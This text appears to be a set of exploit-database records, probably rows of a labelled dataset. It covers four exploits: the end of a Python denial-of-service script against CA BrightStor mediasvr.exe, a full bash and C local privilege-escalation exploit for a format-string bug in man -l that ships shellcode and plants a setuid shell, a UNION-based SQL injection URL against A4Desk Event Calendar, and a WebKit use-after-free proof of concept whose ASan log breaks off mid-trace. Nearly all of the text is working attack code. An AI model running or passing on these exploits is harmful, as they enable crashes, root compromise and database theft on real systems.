#------------------------------------------------------------------------  def ExploitMediaSvr(target,port): 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	sock.connect((target, port)) 	sock.send(rpc_packet)    	sock.close() 	print '[+] Done...\n[+] Mediasvr.exe is dead\n[+] ... or it will die in a few seconds for you inpatient bastards\n'   def GetMediaSvrPort(target): 	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 	sock.connect((target,111)) 	sock.send(rpc_portmap_req) 	rec = sock.recv(256)  	port1 = rec[-4] 	port2 = rec[-3] 	port3 = rec[-2] 	port4 = rec[-1]	 	 	port1 = hex(ord(port1)) 	port2 = hex(ord(port2)) 	port3 = hex(ord(port3)) 	port4 = hex(ord(port4)) 	port = '%02x%02x%02x%02x' % (int(port1,16),int(port2,16),int(port3,16),int(port4,16)) 	 	port = int(port,16) 	 	print '[+] Sending TCP Packet of Death to Target: %s Port: %s' % (target,port) 	ExploitMediaSvr(target,port) 	    if __name__==""__main__"":        try:                target = sys.argv[1]        except IndexError:            	print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe DoS (catirpc.dll/rwxdr.dll)'        		print '[+] Author: Shirkdog'                	print '[+] Usage: %s <target ip>\n' % sys.argv[0]                	sys.exit(-1)         print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe DoS (catirpc.dll/rwxdr.dll)'        print '[+] Author: Shirkdog'         GetMediaSvrPort(target)  # milw0rm.com [2007-05-16]","[""'Mediasvr.exe'"", 'cactirpc.dll']",1
20604,"Debian 2.2 / Su.S.E 6.3/6.4/7.0 - man '-l' Format String source: https://www.securityfocus.com/bid/2327/info  man is the manual page viewing program, available with the Linux Operating System in this implementation. It is freely distributed and openly maintained.  A problem with the man command may allow for the elevation of privileges. Due to the handling of format strings by the -l argument of the man command, it may be possible for a local user to pass format strings through the man command, which could allow a user to write to a specific address in the stack and overwrite variables, including the return address of functions on the stack. man, as implemented with some distributions of the Linux operating system, is included as an SUID root binary.  It may be possible for a malicious user with local access to execute arbitrary code on the stack, and potentially gain elevated privileges, including administrative access.   #!/bin/bash  #	CONFIGURATION: umask 000 target=""/usr/bin/man"" tmpdir=""/tmp/manexpl"" rm -rf ""$tmpdir""  #       address we want to write to (ret on the stack) #       has to be an absolute address but we brute force #		this scanning 64 addresses from writeadr on writeadr=""0xbffff180""  #       address of the shell in our string #		must point somewhere to our 'nop' region shadr=""0xbffff720""  #	number of nops before shellcode declare -i nnops nnops=128  #	brute force how many times declare -i nbrute nbrute=512   echo echo ""-------------------------------------------"" echo ""|           local man exploit             |"" echo ""|              by IhaQueR                 |"" echo ""|    only for demonstrative purposes      |"" echo ""-------------------------------------------"" echo  echo echo ""configured for running $target"" echo echo ""RETADR = $writeadr"" echo ""SHELL  = $shadr"" echo ""NOPS   = $nnops"" echo  shellfake=""SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"" nop=""N""  #	prepare mkdir -p ""$tmpdir"" if ! test -d ""$tmpdir"" ; then 	echo ""[-] creating working dir, exit"" 	exit 1 fi;  echo ""[+] created working dir"" cd ""$tmpdir"" echo  #	number of nops before shellcode declare -i nnops nnops=128  #	make nop field declare -i idx idx=0  nopcode="""" head=""""  while test $idx -lt $nnops; do 	nopcode=""${nop}$nopcode"" 	idx=$(($idx+1)) done;   #	sanity check :-) if ! test -x $target ; then 	echo ""[-] $target not found or not executable, sorry"" 	exit 1 fi;  echo ""[+] found $target"" echo  #	get uids muid=$(id -u man) ruid=$(id -u) if ! test $muid="""" || ! test $ruid="""" ; then 	echo ""[-] error checking ids, sorry"" 	exit 2; fi;  printf ""[+] uid=%d\t\tmid=%d"" $ruid $muid echo  declare -i cnt declare -i cntmax cnt=0  #	max gstring length*4 cntmax=1024   #	make string used for offset search #	like <head><addr><nops><shellcode> #	PP stands for padding hstring=""%0016d%x%0016d%d%0016d%d%0016d%dABCDEEEEFFFFGGGGHHHHIIIIJJJJKKKK${nopcode}${shellfake}"" gstring=""""  #	find offset echo ""    now searching for offset"" echo  declare -i npad declare -i ocnt ocnt=0  while test $cnt -le $cntmax ; do 	if test $ocnt -eq 4 ; then 		ocnt=0 		echo 	fi;  	gstring=""%16g$gstring"" 	cnt=$(($cnt+1)) 	npad=0 	padding=""""  	printf ""[%4d "" $cnt  	while test $npad -lt 8 ; do 		echo -n "" $npad"" 		result=$($target -l ""$gstring$hstring"" -p ""$padding"" a 2>&1 | grep ""44434241"") 		if test ""$result"" != """" ; then 			break 2; 		fi; 		padding=""P$padding"" 		npad=$(($npad+1)) 	done;  	echo -n "" ]   "" 	ocnt=$(($ocnt+1)) done  echo ""]  "" echo echo  #	found offset declare -i offset offset=$(($cnt * 4))  if test $cnt -gt $cntmax ; then 	echo ""[-] offset not found, please tune me :-)"" 	exit 2 fi;  echo ""[+] OFFSET found to be $offset/$cnt pad=$npad""   #	number of bytes written so far declare -i nwrt nwrt=$((16*${cnt}))  echo ""    now constructing magic string nwrt=$nwrt"" echo  #	we need unsigned arithmetics, simple c tool cat <<__ATOOL__> atool.c  #include <stdio.h>  int main(int argc, char** argv) { int i, flip; unsigned adr, shadr, nwrt, ruid, muid; unsigned char* p; unsigned addr[9]; unsigned char head[33]=""%0016d%x%0016d%x%0016d%x%0016d%x""; unsigned char nop[1024]; unsigned char buf[8192];  //		IhaQueR's special code (no trojan, believe me :-) char hellcode[]=	""\x31\xc0\x31\xdb\x31\xc9"" 					""\xb1\x01\xb7\x02\xb3\x03"" 					""\xb0\x46\xcd\x80"" 					""\x31\xc0\x31\xdb\x31\xc9"" 					""\xb3\x01\xb5\x02\xb1\x03"" 					""\xb0\x46\xcd\x80"" 					""\x31\xc0\x31\xdb"" 					""\xb3\x01\xb0\x17\xcd\x80"" 					""\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"" 					""\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd""    					""\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff./mkmsh"";   //		correct hellcode for current ruid, muid 		ruid = $ruid; 		muid = $muid; 		hellcode[7] = muid & 0xff; 		hellcode[9] = (ruid >> 8 ) & 0xff; 		hellcode[11] = ruid & 0xff; 		hellcode[23]=hellcode[7]; 		hellcode[25]=hellcode[9]; 		hellcode[27]=hellcode[11]; 		hellcode[37]=hellcode[7];  		adr = $writeadr; 		adr += atol(argv[1]);  //		address field 		for(i=0; i<4; i++) { 			addr[2*i] = adr + i; 			addr[2*i+1] = adr + i; 		} 		addr[8]=0;  //		head 		shadr = $shadr; 		nwrt = $nwrt + 0; 		p = (unsigned char*)&shadr; 		for(i=0; i<4; i++) { 			flip = (((int)256) + ((int)p[i])) - ((int)(nwrt % 256)); 			nwrt = nwrt + flip; 			sprintf(head+i*8, ""%%%04dx%%n"", flip); 		} 		head[32] = 0;  //		nops 		for(i=0; i<$nnops; i++) 			nop[i] = 0x90; 		nop[i] = 0;  		sprintf(buf, ""$target -l '%s%s%s%s%s' -p \""$padding\"" a 2>&1"", ""$gstring"", head, addr, nop, hellcode); 		system(buf); } __ATOOL__  #	helper apps rm -f atool gcc atool.c -o atool if ! test -x atool ; then 	echo ""[-] compilation error, exiting"" 	exit 3 fi;  echo ""[+] compiled address tool""  #	mansh cat <<__MANSH__> mansh.c main(int argc, char** argv) { 	setreuid($muid, $ruid); 	execv(""/bin/sh"", argv); } __MANSH__  rm -rf mansh rm -rf umansh gcc mansh.c -o umansh if ! test -x umansh ; then 	echo ""[-] compilation error, exiting"" 	exit 4 fi;  echo ""[+] compiled mansh""  #	mkmsh cat <<__MKMSH__> mkmsh #!/bin/bash cp umansh mansh chmod u+s mansh __MKMSH__ chmod a+x mkmsh  if ! test -x mkmsh ; then 	echo ""[-] compilation error, exiting"" 	exit 5 fi;  echo ""[+] mkmsh ready""   #	brute force echo ""    now brute force, wait..."" echo  idx=0 ocnt=1 umask 022  while test $idx -lt $nbrute ; do 	result=$(atool ""$(($idx*4))"") 	if test -x mansh ; then 		echo 		echo 		echo ""[+] SUCCESS"" 		echo 		echo ""    suid man shell at $tmpdir/mansh"" 		echo 		exit 6 	fi; 	printf ""[%4d] "" $idx 	if test $ocnt -eq 16 ; then 		ocnt=0; 		echo 	fi; 	idx=$(($idx+1)) 	ocnt=$(($ocnt+1)) done;  #	cleanup echo echo ""[-] FAILED, tune writeadr, shadr, nnops, nbrute, etc."" echo echo rm -rf ""$tmpdir""  --------------60A11DEE53A9281CA54089A7--","[""'-l'""]",0
32803,"A4Desk Event Calendar - 'eventid' SQL Injection source: https://www.securityfocus.com/bid/33835/info  A4Desk Event Calendar is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.    http://www.example.com/[path]/admin/index.php?eventid=-1+union+all+select+1,concat_ws(version(),0x3a,database(),0x3a,user()),3,4,5,6--","[""'eventid'""]",1
45482,"WebKit - 'WebCore::Node::ensureRareData' Use-After-Free <!-- There is a use-after-free security vulnerability in WebKit. The vulnerability was confirmed on the ASan build of WebKit revision 233006 on OSX.  PoC:  ================================================================= -->  <style> .class1 { -webkit-mask-box-image-source: url(#foo); } </style> <script> function freememory() {  var a;  for(var i=0;i<100;i++) {    a = new Uint8Array(1024*1024);  }  document.implementation.createHTMLDocument(""doc""); } function jsfuzzer() { try { var00097 = document.createElement(""source""); } catch(e) { } try { var00097.addEventListener(""DOMSubtreeModified"", eventhandler5); } catch(e) { } try { var00097.setAttribute(""onsubmit"", ""eventhandler3()""); } catch(e) { } } function eventhandler1() { /* newvar{htmlvar00027:HTMLDataListElement} */ var htmlvar00027 = document.createElement(""datalist""); //HTMLDataListElement try { /* */ var var00060 = eventhandler4; } catch(e) { } try { htmlvar00010.appendChild(htmlvar00009); } catch(e) { } try { document.title = ""foo""; } catch(e) { } try { htmlvar00027.addEventListener(""DOMNodeInsertedIntoDocument"", var00060); } catch(e) { } try { htmlvar00008.appendChild(htmlvar00027); } catch(e) { } freememory(); } function eventhandler4() { try { var var00167 = document.createRange(); } catch(e) { } try { var00167.setEndAfter(htmlvar00015); } catch(e) { } try { var00167.deleteContents(); } catch(e) { } } function eventhandler5() { try { htmlvar00008.setAttribute(""onbeforeload"", ""eventhandler1()""); } catch(e) { } try { htmlvar00010.addEventListener(""DOMNodeRemovedFromDocument"", eventhandler1); } catch(e) { } try { /* newvar{var00107:Element} */ var var00107 = htmlvar00004.querySelector(""title"");  } catch(e) { } try { htmlvar00010.replaceWith(var00107); } catch(e) { } } </script> <body onload=jsfuzzer()> <li class=""class1"">a</li> <object id=""htmlvar00008""> <param id=""htmlvar00009""></param> </object> <select id=""htmlvar00010""> <option id=""htmlvar00015"">a</option>  <!-- =================================================================  ASan log:  ================================================================= ==69151==ERROR: AddressSanitizer: heap-use-after-free on address 0x60800006aa34 at pc 0x00011465061a bp 0x7ffee1997330 sp 0x7ffee1997328 READ of size 4 at 0x60800006aa34 thread T0 ==69151==WARNING: invalid path to external symbolizer! ==69151==WARNING: Failed to use and restart external symbolizer!     #0 0x114650619 in WebCore::Node::getFlag(WebCore::Node::NodeFlags) const (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb8619)     #1 0x116998b2d in WebCore::Node::ensureRareData() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2400b2d)     #2 0x116a8e148 in WebCore::Element::ensureElementRareData() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x24f6148)     #3 0x116aa5e5a in WebCore::Element::resolveComputedStyle() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x250de5a)     #4 0x116aa66d8 in WebCore::Element::computedStyle(WebCore::PseudoId) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x250e6d8)     #5 0x116f59ee9 in WebCore::HTMLTitleElement::computedTextWithDirection() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x29c1ee9)     #6 0x116f59db1 in WebCore::HTMLTitleElement::childrenChanged(WebCore::ContainerNode::ChildChange const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x29c1db1)     #7 0x116993126 in WebCore::ContainerNode::appendChildWithoutPreInsertionValidityCheck(WebCore::Node&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x23fb126)     #8 0x116996e05 in WebCore::ContainerNode::replaceAllChildren(WTF::Ref<WebCore::Node, WTF::DumbPtrTraits<WebCore::Node> >&&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x23fee05)     #9 0x116b2e058 in WebCore::Node::setTextContent(WTF::String const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2596058)     #10 0x1169e6fb9 in WebCore::Document::setTitle(WTF::String const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x244efb9)     #11 0x114dd2ef8 in WebCore::setJSDocumentTitleSetter(JSC::ExecState&, WebCore::JSDocument&, JSC::JSValue, JSC::ThrowScope&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x83aef8)     #12 0x114da64b6 in bool WebCore::IDLAttribute<WebCore::JSDocument>::set<&(WebCore::setJSDocumentTitleSetter(JSC::ExecState&, WebCore::JSDocument&, JSC::JSValue, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)0>(JSC::ExecState&, long long, long long, char const*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x80e4b6)     #13 0x126386f98 in JSC::callCustomSetter(JSC::ExecState*, bool (*)(JSC::ExecState*, long long, long long), bool, JSC::JSValue, JSC::JSValue) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2498f98)     #14 0x1263870d1 in JSC::callCustomSetter(JSC::ExecState*, JSC::JSValue, bool, JSC::JSObject*, JSC::JSValue, JSC::JSValue) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x24990d1)     #15 0x12652e732 in JSC::JSObject::putInlineSlow(JSC::ExecState*, JSC::PropertyName, JSC::JSValue, JSC::PutPropertySlot&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2640732)     #16 0x1260256d9 in llint_slow_path_put_by_id (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x21376d9)     #17 0x123ffc67b in llint_entry (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x10e67b)     #18 0x123ff933a in vmEntryToJavaScript (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x10b33a)     #19 0x125d68964 in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1e7a964)     #20 0x12633a5b9 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244c5b9)     #21 0x12633a74b in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244c74b)     #22 0x12633aaf1 in JSC::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244caf1)     #23 0x1164446b8 in WebCore::JSMainThreadExecState::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1eac6b8)     #24 0x116492b9c in WebCore::JSEventListener::handleEvent(WebCore::ScriptExecutionContext&, WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1efab9c)     #25 0x116ad19ee in WebCore::EventTarget::fireEventListeners(WebCore::Event&, WTF::Vector<WTF::RefPtr<WebCore::RegisteredEventListener, WTF::DumbPtrTraits<WebCore::RegisteredEventListener> >, 1ul, WTF::CrashOnOverflow, 16ul>) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25399ee)     #26 0x116accfbe in WebCore::EventTarget::fireEventListeners(WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2534fbe)     #27 0x116ab0590 in WebCore::EventContext::handleLocalEvents(WebCore::Event&) const (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2518590)     #28 0x116ac465b in WebCore::dispatchEventInDOM(WebCore::Event&, WebCore::EventPath const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x252c65b)     #29 0x116ac405e in WebCore::EventDispatcher::dispatchEvent(WebCore::Node&, WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x252c05e)     #30 0x116ac3aed in WebCore::EventDispatcher::dispatchScopedEvent(WebCore::Node&, WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x252baed)     #31 0x1169a43c9 in WebCore::dispatchChildRemovalEvents(WTF::Ref<WebCore::Node, WTF::DumbPtrTraits<WebCore::Node> >&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x240c3c9)     #32 0x116995156 in WebCore::ContainerNode::removeChild(WebCore::Node&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x23fd156)     #33 0x116994703 in WebCore::ContainerNode::replaceChild(WebCore::Node&, WebCore::Node&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x23fc703)     #34 0x116b2896b in WebCore::Node::replaceWith(WTF::Vector<WTF::Variant<WTF::RefPtr<WebCore::Node, WTF::DumbPtrTraits<WebCore::Node> >, WTF::String>, 0ul, WTF::CrashOnOverflow, 16ul>&&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x259096b)     #35 0x114e540ba in WebCore::jsElementPrototypeFunctionReplaceWithBody(JSC::ExecState*, WebCore::JSElement*, JSC::ThrowScope&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x8bc0ba)     #36 0x114e35a87 in long long WebCore::IDLOperation<WebCore::JSElement>::call<&(WebCore::jsElementPrototypeFunctionReplaceWithBody(JSC::ExecState*, WebCore::JSElement*, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)0>(JSC::ExecState&, char const*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x89da87)     #37 0x17ac3cce176  (<unknown module>)     #38 0x123fffd08 in llint_entry (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x111d08)     #39 0x123ff933a in vmEntryToJavaScript (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x10b33a)     #40 0x125d68964 in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1e7a964)     #41 0x12633a5b9 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244c5b9)     #42 0x12633a74b in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244c74b)     #43 0x12633aaf1 in JSC::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244caf1)     #44 0x1164446b8 in WebCore::JSMainThreadExecState::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1eac6b8)     #45 0x116492b9c in WebCore::JSEventListener::handleEvent(WebCore::ScriptExecutionContext&, WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1efab9c)     #46 0x116ad19ee in WebCore::EventTarget::fireEventListeners(WebCore::Event&, WTF::Vector<WTF::RefPtr<WebCore::RegisteredEventListener, WTF::DumbPtrTraits<WebCore::RegisteredEventListener> >, 1ul, WTF::CrashOnOverflow, 16ul>) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25399ee)     #47 0x116accfbe in WebCore::EventTarget::fireEventListeners(WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2534fbe)     #48 0x116ab0590 in WebCore::EventContext::handleLocalEvents(WebCore::Event&) const (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2518590)     #49 0x116ac465b in WebCore::dispatchEventInDOM(WebCore::Event&, WebCore::EventPath const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x252c65b)     #50 0x116ac405e in WebCore::EventDispatcher::dispatchEvent(WebCore::Node&, WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x252c05e)     #51 0x116ac3aed in WebCore::EventDispatcher::dispatchScopedEvent(WebCore::Node&, WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x252baed)     #52 0x116b336fd in WebCore::Node::dispatchSubtreeModifiedEvent() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x259b6fd)     #53 0x116aa08b5 in WebCore::Element::addAttributeInternal(WebCore::QualifiedName const&, WTF::AtomicString const&, WebCore::Element::SynchronizationOfLazyAttribute) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25088b5)     #54 0x116a98e58 in WebCore::Element::setAttributeInternal(unsigned int, WebCore::QualifiedName const&, WTF::AtomicString const&, WebCore::Element::SynchronizationOfLazyAttribute) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2500e58)     #55 0x116a98c15 in WebCore::Element::setAttribute(WTF::AtomicString const&, WTF::AtomicString const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2500c15)     #56 0x114e49c37 in WebCore::jsElementPrototypeFunctionSetAttributeBody(JSC::ExecState*, WebCore::JSElement*, JSC::ThrowScope&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x8b1c37)     #57 0x114e30ba7 in long long WebCore::IDLOperation<WebCore::JSElement>::call<&(WebCore::jsElementPrototypeFunctionSetAttributeBody(JSC::ExecState*, WebCore::JSElement*, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)0>(JSC::ExecState&, char const*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x898ba7)     #58 0x17ac3cce176  (<unknown module>)     #59 0x123fffd08 in llint_entry (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x111d08)     #60 0x123fffd08 in llint_entry (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x111d08)     #61 0x123ff933a in vmEntryToJavaScript (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x10b33a)     #62 0x125d68964 in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1e7a964)     #63 0x12633a5b9 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244c5b9)     #64 0x12633a74b in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244c74b)     #65 0x12633aaf1 in JSC::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x244caf1)     #66 0x1164446b8 in WebCore::JSMainThreadExecState::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1eac6b8)     #67 0x116492b9c in WebCore::JSEventListener::handleEvent(WebCore::ScriptExecutionContext&, WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1efab9c)     #68 0x116ad19ee in WebCore::EventTarget::fireEventListeners(WebCore::Event&, WTF::Vector<WTF::RefPtr<WebCore::RegisteredEventListener, WTF::DumbPtrTraits<WebCore::RegisteredEventListener> >, 1ul, WTF::CrashOnOverflow, 16ul>) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x25399ee)     #69 0x116accfbe in WebCore::EventTarget::fireEventListeners(WebCore::Event&) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2534fbe)     #70 0x1174585a5 in WebCore::DOMWindow::dispatchEvent(WebCore::Event&, WebCore::EventTarget*) (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2ec05a5)     #71 0x117468e04 in WebCore::DOMWindow::dispatchLoadEvent() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2ed0e04)     #72 0x1169f165f in WebCore::Document::dispatchWindowLoadEvent() (/Users/projectzero/webkit/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x245965f)     #73 0x1169ea580 in 